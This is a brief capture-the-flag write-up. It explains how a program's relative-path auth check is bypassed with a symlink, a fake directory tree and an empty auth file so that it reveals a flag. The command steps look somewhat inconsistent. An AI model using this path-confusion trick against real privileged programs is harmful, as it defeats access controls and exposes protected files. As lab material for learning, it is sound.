# Just No
> A program at /problems/7e8b456c98db60be9a33339ab4509fca has access to a flag but refuses to share it. Can you convince it otherwise?

## Write-up

**justno.c**

auth file's address is given by relative address

> fopen("../../problems/7e8b456c98db60be9a33339ab4509fca/auth","r")

and the flag file's address is given by absolute address

> fopen("/problems/7e8b456c98db60be9a33339ab4509fca/flag","r");


So, the solution is,

> ln -s /problems/7e8b456c98db60be9a33339ab4509fca/justno ~/no/no/justno

> mkdir ~/problems/7e8b456c98db60be9a33339ab4509fca/

> touch ~/problems/7e8b456c98db60be9a33339ab4509fca/auth

> ~/justno
